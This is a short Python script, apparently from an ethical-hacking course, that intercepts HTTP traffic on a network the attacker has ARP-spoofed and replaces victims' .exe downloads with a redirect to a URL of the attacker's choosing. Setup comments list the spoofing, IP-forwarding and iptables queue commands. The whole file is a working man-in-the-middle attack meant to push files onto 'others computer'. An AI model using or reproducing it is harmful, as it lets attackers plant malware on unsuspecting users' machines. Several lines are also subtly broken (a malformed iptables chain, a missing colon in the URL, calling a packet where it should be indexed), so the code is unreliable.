#!/usr/bin/env python
#THESE COMMANDS USED BEFORE RUNNING THIS PHYTHON FILE
#USE COMMANDS CMD1 : "service apache2 start"
#USE COMMANDS CMD2 : "iptables -I ACCEPT -j NFQUEUE --queue-num 0"
#USE COMMANDS CMD3 : "iptables -I FORWARD -j NFQUEUE --queue-num 0"
#USE COMMANDS CMD4 (GOTO THIS ARP_SPOOF LIBRARY): "python arp_spoof.py"
#USE THIS COMMAND IN ANOTHER TERMINAL CMD5 : "echo 1 >/proc/sys/net/ipv4/ip_forward"
#NOW RUN THIS FILE USING COMMAND : "python replace_downloads.py"



import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load =load # Change this http//www.example.org/index.asp to any other downloading URL you want to download in others computer
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP REQUEST")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet(scapy.TCP).ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http//www.example.org/index.asp\n\n" )

                packet.set_payload(str(modified_packet))



    packet.accept() #The packet is trapped using this
    #packet.accept() #packet is forward to the destination

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)# 0 is queue no used in above command
queue.run()


#ping -c bing.com